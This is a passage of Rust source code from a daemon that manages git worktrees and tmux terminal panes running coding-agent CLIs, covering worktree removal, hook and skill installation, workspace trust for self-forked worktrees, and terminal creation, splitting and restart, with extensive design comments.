        Ok(holds_an_unseen_skill_file(worktree).await)
    }

    /// Remove a workspace's worktree.
    ///
    /// The most destructive action in the product. It CLOSES every terminal in
    /// the workspace rather than refusing while one is running: the user asked
    /// for the worktree gone, and telling them to go and stop four terminals
    /// first is telling them to do the thing they just asked for. What the old
    /// refusal protected — a directory deleted out from under a live process —
    /// is protected by killing the process first instead.
    ///
    /// Still refused outright when the tmux inventory cannot be trusted at all:
    /// `derive_terminal` reports EVERY terminal as `Lost` when the inventory is
    /// unhealthy (`crates/core/src/derive.rs`), so a momentarily unreachable
    /// tmux server is exactly the condition under which "nothing is running
    /// here" is a lie. That check is what makes closing the terminals safe, and
    /// it comes first for that reason.
    ///
    /// It never deletes the branch: git history and anything pushed survive
    /// untouched. A dirty worktree still requires the caller to have
    /// confirmed, decided by `removal_needs_confirmation`.
    pub async fn remove_worktree(&self, id: Uuid) -> Result<()> {
        let ws = self.store.get_workspace(id)?;
        let repo = self.store.get_repository(ws.repository_id)?;
        let repo_path = self.repository_worktree(&repo);

        // Never the repository's own checkout. The flag comes from git's own
        // worktree list, so this does not depend on a path comparison
        // agreeing with however the repository was registered.
        if ws.is_main_checkout {
            return Err(DomainError::InvalidArgument { what: "the main checkout" });
        }

        // A second, independent check of the same fact, kept alongside the
        // flag rather than in place of it. Migration 0006 added
        // `is_main_checkout` with `DEFAULT 0`, so on any database written
        // before this feature existed the main checkout's row says it is an
        // ordinary worktree until `reconcile::repository` runs and heals it
        // -- and the flag can end up wrong for other reasons a future bug
        // might introduce, too. Comparing paths directly means this refusal
        // never depends on that flag having been correct, so the only thing
        // standing between a stale row and deleting the directory the user
        // works in is never just git's own refusal to remove its primary
        // working tree -- which is precisely the safety net this check
        // exists to not rely on.
        if canonical_or_raw(&ws.worktree_path) == canonical_or_raw(&repo_path.to_string_lossy()) {
            return Err(DomainError::InvalidArgument { what: "the main checkout" });
        }

        // Refused outright if the tmux inventory cannot be trusted at all.
        // Must come before the running check below, since an unhealthy
        // inventory is exactly what would make that check lie.
        if !self.inventory_snapshot().inventory_healthy {
            return Err(DomainError::TmuxUnavailable);
        }

        // Closing what is running here is part of removing it, not a reason to
        // refuse. This used to return `RunningProcesses`, which meant a client
        // told the user to go and stop four terminals by hand — the thing they
        // had just asked for by pressing Remove.
        //
        // The guard that replaced existed to keep a directory from being deleted
        // out from under a live process, and that property is KEPT: the process
        // is killed first, which is a different thing from skipping the check.
        // The unhealthy-inventory refusal above is what makes this safe to do at
        // all — without it, "nothing is running here" is a lie precisely when
        // tmux is unreachable, which is why it must stay above this.
        //
        // Two steps per terminal rather than one, because that is the sequence
        // that already works: `stop_terminal` kills the pane and sets intent
        // Stopped, which is what makes the `remove_terminal` that follows pass
        // its own running check. `remove_root` deletes its workspaces' terminals
        // through the same pair, for the stated reason that a hand-rolled
        // deletion beside it would orphan the pane `remain-on-exit` retains.
        //
        // `stop_terminal`'s result is discarded and `remove_terminal`'s is not,
        // and the asymmetry is deliberate. A terminal whose pane is already gone
        // has nothing to stop, and that is no reason to keep the worktree; a
        // record that will not delete is, because `terminals.workspace_id` is a
        // foreign key with no cascade and the workspace row is about to go.
        for term in self.store.list_terminals_for_workspace(ws.id)? {
            let _ = self.stop_terminal(term.id).await;
            self.remove_terminal(term.id).await?;
        }

        let lock = self.repo_lock(repo.id);
        let _guard = lock.lock().await;

        let dest = PathBuf::from(&ws.worktree_path);

        let out = git::git(
            &repo_path,
            &["worktree", "remove", "--force", &dest.to_string_lossy()],
        )
        .await?;

        if !out.ok {
            tracing::warn!(stderr = %out.stderr, "worktree remove failed");
            return Err(DomainError::OperationFailed);
        }

        // The workspace record goes with the worktree; the BRANCH stays.
        self.store.delete_workspace(id, ws.resource_version)
    }

    // ---- terminals ----

    /// Put everything this pane needs in order to report itself in place, and
    /// hand back the settings file claude is launched with — or `None`, for
    /// the two agents registered through a file in the worktree instead and
    /// the several that are not registered at all.
    ///
    /// **Every path that puts a TUI in a pane calls this.** There are four —
    /// `create_terminal`, `split_terminal`, `restart_terminal` and
    /// `set_pane_mode` going back to a terminal — and the first version of the
    /// claude half wired only the first. That left the live view working
    /// exactly once, on a pane made by the New Terminal button and never
    /// restarted; splitting, which `split_terminal`'s own comment calls "how
    /// most panes on a runner are made", produced a silent one.
    /// `every_launch_path_prepares_hooks_before_it_builds_a_command` in this
    /// file's tests is what notices a fifth path arriving without this call.
    ///
    /// The two halves are one function because they are one question — "make
    /// this agent able to report itself, here" — and splitting them is exactly
    /// how the bug this fixes happened. claude's `--settings` hung off the
    /// launch; codex's and cursor's project files hung off `create_workspace`
    /// and `adopt_branch`. So a worktree Far Cooler made had all three, and the
    /// checkout a person actually works in — adopted by the reconciler, never
    /// created by us — had only claude. The one repository that mattered most
    /// was the one that stayed silent.
    ///
    /// **`set_pane_mode` going the other way, into `Agent`, deliberately does
    /// not call this** — and not for the reason it is tempting to give. A codex
    /// process really does start in this worktree there: the pane runs
    /// `farcooler agent-host`, which spawns its adapter with `current_dir` set
    /// to the worktree (`acp::conn`), so `.codex/hooks.json` really would be
    /// read. The reason is one step further on. Every hook record routed to a
    /// pane in `Agent` mode is dropped by `hook_ingress::is_a_chat`, on both of
    /// `terminal_for`'s routes, because that pane's conversation already
    /// arrives over its shim and folding the hooks in as well would show the
    /// user every assistant turn twice. So installing there could not produce a
    /// live view even if the file were read — it would be a write into
    /// somebody's repository with nothing on the other end of it.
    ///
    /// **Per worktree, not per repository.** The ruling says "first agent
    /// launch in that repository", but git gives every worktree its own
    /// working directory and an untracked `.codex/hooks.json` in one is
    /// invisible from another. There is nowhere a repository-wide copy could
    /// live that codex or cursor would read. So the file goes into the
    /// worktree this pane launches in, and "first" is per worktree because it
    /// can be nothing else.
    ///
    /// **Nothing is remembered, and nothing needs to be.** "First" wants no
    /// flag: the merge is a pure function of the socket path, the socket is
    /// `<root>/h.sock` for as long as this daemon lives, and
    /// `install_project_hook_file` returns without writing when the merge
    /// changes nothing. The first launch in a worktree writes; every later one
    /// reads one small file and stops. No row, no column, no migration.
    ///
    /// **The reconciler is deliberately still not a caller.** Installing from
    /// there would write into every repository git reports, none of which
    /// anybody pointed Far Cooler at. The trigger is an act — this agent, in
    /// this worktree, because somebody opened it.
    ///
    /// **The manager skill rides on the same act.** claude and cursor get a
    /// plugin in the runtime directory, returned as `LaunchExtras::plugin_dir`
    /// and handed over as `--plugin-dir`; codex, which has no such flag, gets a
    /// copy written into this worktree by `install_project_skill`, with a line
    /// in the repository's `info/exclude` so git ignores it. Nothing of it is
    /// user-level, and opening claude or cursor writes nothing into the
    /// repository. See `skill_install` for how each agent was measured
    /// finding it.
    ///
    /// Never fails, in either half. A read-only mount, a `.cursor` that is a
    /// file, a hooks file we cannot parse, a runtime directory we cannot write
    /// — each of those costs the live view for that agent in that worktree and
    /// nothing else. A pane that opens quiet beats a pane that will not open.
    async fn prepare_launch_hooks(&self, preset: &str, worktree: &str) -> LaunchExtras {
        if let Some((relative, merge)) = project_hook_file_for(preset) {
            install_project_hook_file(
                Path::new(worktree),
                relative,
                &hook_ingress::HookIngress::socket_path(&self.root),
                merge,
            )
            .await;
        }
        // The manager skill codex reads from the worktree, on the same act.
        if let Some(harness) = project_skill_for(preset) {
            install_project_skill(Path::new(worktree), harness).await;
        }
        // claude's half, unchanged, and gated by the same `starts_with` that
        // gates minting a session id, for the same reason: `--settings` is
        // claude's flag, and putting it in front of another CLI would kill the
        // pane on startup rather than merely leave it quiet.
        let claude = preset.starts_with("claude");
        let settings = claude.then(|| write_claude_hook_settings(&self.root)).flatten();
        // The manager skill: a plugin in the runtime directory, handed over as
        // `--plugin-dir` to claude and to cursor, which both take the flag.
        let plugin_dir = takes_plugin_dir(preset).then(|| write_plugin(&self.root)).flatten();
        // cursor's `--trust`, for a worktree this runner made for a new task.
        // See `LaunchExtras::trust_workspace`.
        let trust_workspace = is_cursor(preset) && self.forked_this_worktree(Path::new(worktree));
        // codex's, on the same line: codex has no flag, so its repository gets
        // the entry codex's own trust screen writes. See `codex_trust`.
        // Only for this channel's own install; see `codex_trust::skip_reason`.
        if is_codex(preset) && self.forked_this_worktree(Path::new(worktree)) {
            crate::codex_trust::trust_for_worktree(&self.root, Path::new(worktree)).await;
        }
        LaunchExtras { settings, plugin_dir, trust_workspace, prompt: None }
    }

    /// Whether `worktree` is one this install made for a new task: a real
    /// directory under its own `worktrees/`, whose git admin directory
    /// carries this install's fork mark (`git::mark_forked`).
    ///
    /// The line cursor's `--trust` is drawn on, and codex's trust entry
    /// (`codex_trust`). The two reach differently: cursor's flag trusts this
    /// one launch in this one directory, while codex's entry is the
    /// repository's, so after it codex also opens without asking in the main
    /// checkout and in an adopted worktree of that repository, exactly as one
    /// Enter on codex's own screen would. Trusting a directory is a
    /// decision about its contents — cursor's trust is what lets a project's
    /// own `.cursor/` configuration (MCP servers, hooks, rules) load. A branch
    /// this runner forked from the person's repository holds that
    /// repository's own commits and nothing else yet, and the person asked for
    /// the trust screen to be gone there. Everything else is left to cursor to
    /// ask about, as it always has been:
    ///
    /// - an ADOPTED branch, or one `create` checked out because a remote
    ///   already had the name — somebody else's commits, possibly a
    ///   colleague's config;
    /// - a main checkout, a worktree made by hand, one from before the mark;
    /// - a path that does not exist. tmux starts a pane whose directory is
    ///   missing in `$HOME`, so trusting a missing worktree would trust the
    ///   home directory. `canonicalize` has to succeed — no raw-path
    ///   fallback, which would also let a `..` through a component-wise
    ///   `starts_with`.
    ///
    /// The mark is in git's admin directory, not the working tree: nothing a
    /// branch carries can put it there, and `git worktree remove` takes it
    /// away with the worktree.
    fn forked_this_worktree(&self, worktree: &Path) -> bool {
        let (Ok(ours), Ok(path)) =
            (self.root.join("worktrees").canonicalize(), worktree.canonicalize())
        else {
            return false;
        };
        path.is_dir()
            && path != ours
            && path.starts_with(&ours)
            && git::forked_by(&path).as_deref() == Some(self.install_id.as_str())
    }

    /// Create a terminal: a tagged tmux window running the preset.
    pub async fn create_terminal(
        &self,
        workspace_id: Uuid,
        title: &str,
        command_preset: &str,
    ) -> Result<models::Terminal> {
        self.create_terminal_with_prompt(workspace_id, title, command_preset, None, None).await
    }

    /// Create a terminal whose agent starts on `prompt`: claude, codex and
    /// cursor get it as their launch argument, which is what their own
    /// `--help` calls the initial prompt. Any other preset ignores it.
    ///
    /// An argument rather than typing, which is what the Mac's ⌘N panel did
    /// before this: it waited for the agent to look idle and typed the task
    /// in. Any screen the agent put up first — cursor's trust gate, codex's
    /// update offer — read as blocked, the app gave up, and the task was never
    /// sent. An argument is held by the agent through any screen it shows and
    /// submitted once past it.
    ///
    /// On this launch only. `prompt` goes into this call's `LaunchExtras` and
    /// no other path sets one, so a restart never starts the task again.
    ///
    /// `task` is the board task this pane is opened to work (`task dispatch`).
    /// It is recorded on the terminal, exported as `FARCOOLER_TASK` on this
    /// launch and every later one, and an agent pane's first message becomes
    /// `opening_prompt`, with any `prompt` given after it. See `opening_for`.
    pub async fn create_terminal_with_prompt(
        &self,
        workspace_id: Uuid,
        title: &str,
        command_preset: &str,
        prompt: Option<&str>,
        task: Option<Uuid>,
    ) -> Result<models::Terminal> {
        validate::display_name(title)?;
        validate::command_preset(command_preset)?;
        let prompt = prompt.filter(|p| !p.trim().is_empty());
        if let Some(p) = prompt {
            validate_launch_prompt(p)?;
        }

        let ws = self.store.get_workspace(workspace_id)?;
        let (task_key, prompt) = self.opening_for(&ws, command_preset, task, prompt)?;

        // 1. Commit the durable record with intent RUNNING, unconfirmed.
        let term = self.store.create_terminal_for_task(
            workspace_id,
            title,
            command_preset,
            TerminalIntent::Running,
            120,
            40,
            task,
        )?;

        // A claude terminal gets its session id now, so that adopting it into
        // agent pane mode later is exact.
        //
        // Claude and nothing else, deliberately, and it is worth saying why
        // rather than leaving it looking like an oversight. This id is only
        // real because `preset_command` declares it to the process with
        // `--session-id`, and claude is the one CLI that understands that
        // flag. Minting one for codex would record a uuid codex never uses:
        // `codex_rollout_exists` could never find a rollout behind it, so
        // `respawn_command` would compute `resumable = false` for it forever,
        // and the first switch to chat mode would hand the shim `--session
        // <a session that does not exist>` for `session/load` to fail on.
        // Codex gets a real id the only way it can — from the shim's
        // `Established` report, which `AgentSupervisor::remember_session`
        // writes down the moment it arrives — and a codex pane that has been a
        // chat once does now restart back into its conversation. Giving it one
        // from disk at launch needs a `~/.codex/sessions` reader that does not
        // exist yet.
        let declared = command_preset.starts_with("claude").then(|| Uuid::now_v7().to_string());
        let term = if let Some(ref sid) = declared {
            self.store.set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some(sid.clone()),
                // A terminal nothing has attached to yet has no offsets to
                // invalidate; the epoch it was created with is still true.
                false,
            )?
        } else {
            term
        };
        let term = self.mark_changes_pane(term, command_preset)?;

        // 2. Create and tag the window.
        let extras = self.prepare_launch_hooks(command_preset, &ws.worktree_path).await;
        let command = launch_command_with_prompt(
            &self.root,
            term.id,
            command_preset,
            declared.as_deref(),
            extras,
            prompt.as_deref(),
            task_key.as_deref(),
        );
        #[cfg(test)]
        test_agent::refuse_a_real_agent(&command);
        let created = self
            .tmux
            .create_terminal_window(workspace_id, term.id, title, &ws.worktree_path, &command)
            .await;

        if let Err(e) = created {
            // No pane will ever read a prompt file for this terminal.
            remove_prompt_file(&self.root, term.id);
            // Creation never established a live runtime.
            let _ = self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.intent = TerminalIntent::Failed),
            );
            return Err(e);
        }

        // 3. Verify exact tags on a live pane through a fresh query.
        let snapshot = self.inventory.refresh().await;
        let proved = snapshot.claimants(term.id).iter().any(|p| p.proves_life());

        if proved {
            // 4. Only now is the runtime confirmed.
            return self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            );
        }

        // Verification failed. Leave the record and its intent in place: the
        // derivation reports it truthfully until the user resolves it.
        tracing::warn!(terminal = %term.id, "created window did not verify");
        Ok(term)
    }

    /// The key a pane opened for `task` exports, and the first message it
    /// starts on.
    ///
    /// The task has to be on `ws`'s own board: a pane in one repository filing
    /// notes on another's ticket is the wrong-board write `tasks_with_key`
    /// exists to refuse. An agent pane starts on `opening_prompt`, with the
    /// caller's own `prompt`, if there is one, after it. A shell or a changes
    /// pane gets neither, because nobody dispatched a person's shell (see
    /// `preset_runs_an_agent`), so the caller's prompt is passed through
    /// untouched, to be ignored as it always was.
    fn opening_for(
        &self,
        ws: &models::Workspace,
        preset: &str,
        task: Option<Uuid>,
        prompt: Option<&str>,
    ) -> Result<(Option<String>, Option<String>)> {
        let Some(task) = task else { return Ok((None, prompt.map(str::to_string))) };
        // Only an agent that is told the task can be opened for one. Anything
        // else would export the key beside a program that never reads it (a
        // typo, a shell, an agent with no launch prompt), and the board would
        // say somebody is working a task nobody is. See `TASK_AGENTS`.
        if !farcooler_core::pane_env::takes_a_task(preset) {
            return Err(DomainError::InvalidArgument { what: "command_preset" });
        }
        // Deleted since the caller resolved it: the key is what was wrong,
        // not the workspace a bare `NotFound` would read as.
        let task = self.store.get_task(task).map_err(|e| match e {
            DomainError::NotFound => DomainError::InvalidArgument { what: "task_key" },
            other => other,
        })?;
        if task.repository_id != ws.repository_id {
            return Err(DomainError::InvalidArgument { what: "task_key" });
        }
        let key = Some(task.key).filter(|k| is_safe_model(k));
        let Some(k) = key.as_deref().filter(|_| preset_runs_an_agent(preset)) else {
            return Ok((key, prompt.map(str::to_string)));
        };
        let cli = shell_quote(&shim_binary(std::env::current_exe().ok().as_deref()));
        let opening = opening_prompt(&cli, k);
        let first = match prompt {
            Some(p) => format!("{opening}\n\n{}", p.trim()),
            None => opening,
        };
        Ok((key, Some(first)))
    }

    /// The task `key` names on `workspace`'s own board, for `terminal.create`.
    ///
    /// On that board only. Resolved across every board, a key that happens to
    /// exist elsewhere would open a pane in this repository working another
    /// one's ticket. Exactly one match, or a refusal naming `task_key`: no
    /// match is a typo or another board, and two is the prefixless-key case
    /// `tasks_with_key` returns a list for, which is refused, never picked.
    pub fn task_on_workspace_board(&self, workspace: Uuid, key: &str) -> Result<Uuid> {
        let ws = self.store.get_workspace(workspace)?;
        match self.store.tasks_with_key(Some(ws.repository_id), key.trim())?.as_slice() {
            [task] => Ok(task.id),
            _ => Err(DomainError::InvalidArgument { what: "task_key" }),
        }
    }

    /// The key a relaunch of `term` exports: the one its first launch did.
    fn pane_task_key(&self, term: &models::Terminal) -> Option<String> {
        let key = self.store.get_task(term.task_id?).ok()?.key;
        is_safe_model(&key).then_some(key)
    }

    /// Whether this pane is running Claude Code specifically, and so has a
    /// session on disk this daemon knows how to find.
    ///
    /// This used to ask the broader question — any chat-capable agent — on
    /// the theory that the two questions had the same answer: the only thing
    /// this gates is adopting a CLAUDE session id (`discover_claude_session`
    /// reads `~/.claude/projects/<worktree>` and nothing else), and Claude
    /// used to be the only harness with an adapter. That stopped being true
    /// the moment codex and cursor got adapters too. Left asking the broad
    /// question, a codex pane with no `agent_session_id` of its own would
    /// pass this check, `discover_claude_session` would still be the only
    /// thing on the other side of it, and the codex pane would adopt and
    /// launch with somebody else's CLAUDE conversation — the exact bait the
    /// comments on `set_pane_mode`'s refusal below warn about, reached
    /// through this door instead. So this asks the narrow question again,
    /// permanently: adoption here is Claude-specific because what is being
    /// adopted is a Claude session, and nothing generalises that until
    /// something exists to discover a codex or cursor session from disk. Until
    /// then, `None` from this function is correct for them — they start
    /// fresh, which is the honest answer.
    ///
    /// Screen as well as process name, for the reason `activity::identify`
    /// exists: Claude Code renames itself to its version, so `2.1.220` is an
    /// agent that process matching alone would never find.
    async fn pane_can_adopt_a_claude_session(&self, id: Uuid) -> bool {
        let snapshot = self.inventory.snapshot();
        let Some(pane) = snapshot.panes.iter().find(|p| p.terminal_id == id) else {
            return false;
        };
        let screen = self.screen(id).await.map(|(text, _, _)| text).unwrap_or_default();
        identifies_claude(&self.registry(), &pane.command, &screen)
    }

    /// Open every socket an agent conversation arrives on.
    ///
    /// Two of them, and they are separate stories that happen to start at the
    /// same moment. One socket per terminal in agent pane mode, for the shims;
    /// one for the whole daemon, for the hooks of sessions nobody toggled into
    /// anything.
    ///
    /// A daemon restart must not cost a conversation. The shims survived it —
    /// they live in tmux panes, which is the whole reason they are there — and
    /// they are sitting in their reconnect loop. Without this they dial a
    /// socket nobody is listening on, forever, and every agent pane goes
    /// permanently silent after the first daemon restart while still looking
    /// perfectly healthy.
    ///
    /// Called from `main`, once. Nothing in this workspace can reach a line
    /// inside `main`, so the bind lives here where a test can drive it — which
    /// is not a detail: a `listen` that is written, tested and never called is
    /// precisely how the shim path spent its first week inert, and
    /// `agent_supervisor::ensure_listening` still carries the note.
    pub fn resume_agent_listeners(&self) {
        // The hook path, beside the shim path and independent of it. A runner
        // with no live sessions binds this and never hears anything, which
        // costs one socket.
        //
        // Spawned from `self.hooks` rather than from a `HookIngress` made
        // here, because the assemblers have to be the ones `remove_terminal`
        // can evict from — see the field's own doc.
        //
        // Not idempotent, unlike `ensure_listening` below, and nothing here
        // makes it so: `HookIngress::listen` unlinks the path before it binds,
        // so a second call would take the socket off the first listener and
        // leave it accepting on a path nothing dials. `main` calls this once,
        // at startup, and nothing on a running daemon calls it again.
        let hooks = self.hooks.clone();
        let agents = self.agents.clone();
        let root = self.root.clone();
        tokio::spawn(async move {
            // `listen` returns only on a listener that is genuinely broken,
            // and says so at `error!` on its way out. There is nothing to add
            // here and nothing above this to tell.
            let _ = hooks
                .listen(&root, move |terminal, events| {
                    // Through `record`, which is the tail of `apply`: one
                    // ring, numbered in one place, whichever transport the
                    // events arrived on.
                    //
                    // The same sink `ensure_listening` passes. Clients read
                    // this transcript by asking for it; nothing in the daemon
                    // subscribes to the callback yet.
                    agents.record(terminal, events, &|_, _| {});
                })
                .await;
        });

        let Ok(workspaces) = self.list_workspaces() else { return };
        for ws in workspaces {
            let Ok(terminals) = self.store.list_terminals_for_workspace(ws.id) else { continue };
            for t in terminals.iter().filter(|t| t.pane_mode == models::PaneMode::Agent) {
                self.agents.ensure_listening(&self.root, t.id);
            }
        }
    }

    /// Write an agent's own name for its conversation into the record.
    ///
    /// The supervisor learns this from `session_info_update` and keeps it in
    /// memory, which is right for something the agent revises as it works — and
    /// wrong as the only copy. A daemon restart dropped it, so a pane that had
    /// been "Complete D17 authorization decision" reverted to "claude" and
    /// stayed there until the agent happened to rename the session again.
    ///
    /// Only ever an upgrade, and only over a placeholder or a previous agent
    /// title: a name a PERSON gave a terminal is not something an agent gets to
    /// overwrite.
    pub fn remember_agent_title(&self, id: Uuid, title: &str) {
        let Ok(term) = self.store.get_terminal(id) else { return };
        if term.title == title {
            return;
        }
        let ours = term.title.starts_with("Terminal ") || term.title == "Terminal";
        if !ours && !term.title.is_empty() && term.pane_mode != models::PaneMode::Agent {
            return;
        }
        let _ = self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| u.title = title.to_string()),
        );
    }

    pub async fn backfill_pane_tags(&self) {
        let Ok(panes) = self.tmux.list_tagged_panes().await else { return };
        let mut repaired = 0;
        for pane in panes.iter().filter(|p| p.daemon_id == self.tmux.daemon_id()) {
            if self.tmux.tag_pane_public(&pane.pane_id, pane.terminal_id).await.is_ok() {
                repaired += 1;
            }
        }
        if repaired > 0 {
            tracing::info!(panes = repaired, "pinned pane identity");
        }
    }

    /// A new terminal in an existing layout, beside a pane already there.
    ///
    /// The same act as `create_terminal` except for where the pane lands: a split
    /// of an existing one rather than a window of its own. That difference is the
    /// whole of `%`, `"`, and dropping something on a pane's edge.
    ///
    /// Deliberately shares the create-then-verify order with `create_terminal`:
    /// the durable record goes in first with intent RUNNING and unconfirmed, the
    /// pane is made, and only a fresh query proving a live tagged pane marks it
    /// confirmed. A split that fails leaves a record the derivation reports
    /// honestly rather than one that claims to be running.
    pub async fn split_terminal(
        &self,
        workspace_id: Uuid,
        target: Uuid,
        side: farcooler_protocol::v1::SplitSide,
        title: &str,
        command_preset: &str,
    ) -> Result<models::Terminal> {
        self.split_terminal_with_prompt(workspace_id, target, side, title, command_preset, None, None)
            .await
    }

    /// `split_terminal`, with the agent starting on `prompt` — the first
    /// launch `terminal.create` makes when it is asked to join the active
    /// layout. See `create_terminal_with_prompt`.
    #[allow(clippy::too_many_arguments)]
    pub async fn split_terminal_with_prompt(
        &self,
        workspace_id: Uuid,
        target: Uuid,
        side: farcooler_protocol::v1::SplitSide,
        title: &str,
        command_preset: &str,
        prompt: Option<&str>,
        task: Option<Uuid>,
    ) -> Result<models::Terminal> {
        validate::display_name(title)?;
        validate::command_preset(command_preset)?;
        let prompt = prompt.filter(|p| !p.trim().is_empty());
        if let Some(p) = prompt {
            validate_launch_prompt(p)?;
        }

        let ws = self.store.get_workspace(workspace_id)?;
        let (task_key, prompt) = self.opening_for(&ws, command_preset, task, prompt)?;
        let pane = self.pane_of(target).await?;
        let (axis, before) = crate::layout::split_args(side);

        let term = self.store.create_terminal_for_task(
            workspace_id,
            title,
            command_preset,
            TerminalIntent::Running,
            120,
            40,
            task,
        )?;
        let term = self.mark_changes_pane(term, command_preset)?;

        // The same declaration `create_terminal` makes a few hundred lines up,
        // and for the same reason — a claude pane made by splitting is a
        // claude pane. This line was simply missing: `term` comes straight
        // from `store.create_terminal`, so `agent_session_id` was always
        // `None` here and the `--session-id` this reads was never once
        // written. A pane created that way had no conversation of its own on
        // record, so a restart had nothing to reopen and switching it to a
        // chat had to fall back to guessing from disk. Splitting is how a pane
        // joins a layout, which is how most panes on a runner are made.
        let declared = command_preset.starts_with("claude").then(|| Uuid::now_v7().to_string());
        let term = if let Some(ref sid) = declared {
            self.store.set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some(sid.clone()),
                // A terminal nothing has attached to yet has no offsets to
                // invalidate; the epoch it was created with is still true.
                false,
            )?
        } else {
            term
        };

        // A split is a LAUNCH, not a respawn — the same one `create_terminal`
        // makes — so it gets the same settings file. It read `preset_command`
        // until this line was found: splitting is how most panes on a runner
        // are made, so most claude panes reported nothing at all.
        let extras = self.prepare_launch_hooks(command_preset, &ws.worktree_path).await;
        let command = launch_command_with_prompt(
            &self.root,
            term.id,
            command_preset,
            term.agent_session_id.as_deref(),
            extras,
            prompt.as_deref(),
            task_key.as_deref(),
        );
        #[cfg(test)]
        test_agent::refuse_a_real_agent(&command);
        let created = self
            .tmux
            .split_pane(&pane.pane_id, axis, term.id, &ws.worktree_path, &command, before)
            .await;

        let pane_id = match created {
            Ok(id) => id,
            Err(e) => {
                remove_prompt_file(&self.root, term.id);
                let _ = self.store.update_terminal(
                    term.id,
                    term.resource_version,
                    terminal_update(&term, |u| u.intent = TerminalIntent::Failed),
                );
                return Err(e);
            }
        };

        // The new pane takes the keyboard: you split in order to type in it.
        let _ = self.tmux.select_pane(&pane_id).await;

        let snapshot = self.inventory.refresh().await;
        if snapshot.claimants(term.id).iter().any(|p| p.proves_life()) {
            return self.store.update_terminal(
                term.id,
                term.resource_version,
                terminal_update(&term, |u| u.runtime_confirmed = true),
            );
        }

        tracing::warn!(terminal = %term.id, "split pane did not verify");
        Ok(term)
    }

    /// Kill exactly this terminal's pane.
    ///
    /// A pane, not a window: a window is now a whole layout, and killing one
    /// would take every other terminal in it. That was safe only while each
    /// window held a single pane.
    async fn kill_pane(&self, id: Uuid) -> Result<bool> {
        let Ok(pane) = self.pane_of(id).await else { return Ok(false) };
        self.tmux.kill_pane(&pane.pane_id).await
    }

    /// Stop a terminal. Signals the daemon-owned pane, then records intent.
    pub async fn stop_terminal(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        self.kill_pane(id).await?;
        self.inventory.refresh().await;

        self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| u.intent = TerminalIntent::Stopped),
        )
    }

    /// Forget a lost terminal, without ever claiming it exited.
    ///
    /// It used to only set a flag, which cleared the workspace error and left
    /// the terminal listed as lost with a Dismiss button that could not change
    /// anything a second time. A lost terminal has no pane, no output and no
    /// exit code: once the user has acknowledged it there is nothing left for
    /// the record to say, so dismissing it deletes it.
    ///
    /// Still no exit is invented. `restart` remains the other answer, and it is
    /// the one to reach for when the work mattered — this is the answer for a
    /// row you want gone.
    pub async fn dismiss_lost(&self, id: Uuid) -> Result<()> {
        let term = self.store.get_terminal(id)?;
        let derived = self.derive_one(&term);

        // `Unknown` is refused by the check below too, and that is the whole
        // point of it being its own state: a terminal must never be dismissed
        // as lost because tmux was busy for a second. It is named separately
        // only so the refusal points at the real obstacle — the runner, not
        // the row.
        if derived.state == TerminalState::Unknown {
            return Err(DomainError::InvalidArgument { what: "this runner cannot be read yet" });
        }
        if derived.state != TerminalState::Lost {
            return Err(DomainError::InvalidArgument { what: "terminal is not lost" });
        }

        self.delete_terminal_record(id, term.resource_version)
    }

    /// Restart a lost or exited terminal as a NEW epoch from the same preset.
    pub async fn restart_terminal(&self, id: Uuid) -> Result<models::Terminal> {
        let term = self.store.get_terminal(id)?;
        let ws = self.store.get_workspace(term.workspace_id)?;

        // A restarted claude or codex reattaches to the conversation it
        // already had rather than starting a new one the record does not know
        // about.
        //
        // Through `respawn_command`, which is the builder a pane switching out
        // of chat mode has always used, and NOT `preset_command`, which this
        // line used to call. `preset_command` builds a LAUNCH: its claude arm
        // declares `--session-id`, naming a brand new conversation instead of
        // reopening the one that was lost; its codex arm drops the session on
        // the floor; and its fallback for anything it does not recognize is a
        // bare login shell. That last one is the shape the bug was reported
        // in — a restarted agent pane coming back as "just shell".
        //
        // A TUI, though — not the ACP shim. `respawn_command` knows how to
        // start an agent in a terminal and nothing about `agent-host`, so a
        // lost pane that was in AGENT mode comes back as a plain TUI. The
        // record has to come back with it: left saying `Agent`, SQLite would
        // claim a chat while the pane held a terminal, no shim would ever dial
        // the socket, and the pane's activity would sit frozen at whatever it
        // last reported. That is precisely the silent disagreement between
        // record and runtime this whole design exists to prevent.
        let extras = self.prepare_launch_hooks(&term.command_preset, &ws.worktree_path).await;
        let command = with_pane_env(
            id,
            &term.command_preset,
            self.pane_task_key(&term).as_deref(),
            respawn_command(
                user_home().as_deref(),
                &term.command_preset,
                &ws.worktree_path,
                term.agent_session_id.as_deref().unwrap_or_default(),
                &extras,
            ),
        );
        // The PANE, not the window. This line used to be
        // `kill_terminal_window` followed by `create_terminal_window`, which
        // was safe only while every window held a single terminal. A window is
        // a layout now, and `kill_pane` states the rule this broke: "a window
        // is a layout and killing it would take every terminal arranged in
        // it." Restarting one lost tile of four killed the other three and
        // everything running in them, silently, with nothing on screen saying
        // why.
        //
        // Respawned in place rather than killed and remade, for the same
        // reason `set_pane_mode` respawns: the terminal keeps its pane id, its
        // tag and its rectangle, so a restart does not rearrange the layout
        // around it. `respawn-pane -k` kills whatever is in the pane first, so
        // this is still a restart of a live pane and not only of a dead one —
        // and `remain-on-exit` means an EXITED terminal still has a pane here
        // to respawn.
        //
        // A new window is built only when no pane claims this terminal at all,
        // which is what a genuinely lost terminal is: there is no rectangle
        // left to put the program back into.
        let existing = self.inventory.refresh().await.claimants(id).into_iter().next().cloned();
        #[cfg(test)]
        test_agent::refuse_a_real_agent(&command);
        match existing {
            Some(pane) => self.tmux.respawn_pane(&pane.pane_id, &ws.worktree_path, &command).await?,
            None => {
                self.tmux
                    .create_terminal_window(
                        term.workspace_id,
                        id,
                        &term.title,
                        &ws.worktree_path,
                        &command,
                    )
                    .await?;
            }
        }

        self.inventory.refresh().await;

        let restarted = self.store.update_terminal(
            id,
            term.resource_version,
            terminal_update(&term, |u| {
                u.intent = TerminalIntent::Running;
                u.runtime_confirmed = true;
                u.exit_code = None;
                u.exit_signal = None;
                // A new runtime means a new epoch: offsets restart at zero.
                u.epoch = term.epoch + 1;
            }),
        )?;

